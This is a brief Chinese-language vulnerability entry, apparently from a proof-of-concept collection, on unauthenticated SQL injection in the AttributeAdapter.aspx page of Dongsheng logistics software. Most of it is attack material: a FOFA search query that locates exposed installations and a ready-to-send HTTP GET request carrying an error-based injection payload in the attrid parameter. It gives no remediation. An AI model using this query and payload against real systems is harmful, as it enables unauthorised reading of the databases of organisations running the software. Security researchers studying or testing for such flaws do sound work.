## 东胜物流软件AttributeAdapter.aspx存在SQL注入漏洞

东胜物流软件AttributeAdapter.aspx存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息。

## fofa

```javascript
body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"
```

## poc

```javascript
GET /FeeCodes/AttributeAdapter.aspx?handle=attrinfo&attrid=1%27%20and%201=@@version%20-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0)Firefox/129.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
```

![image-20241106172104100](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411061721169.png)
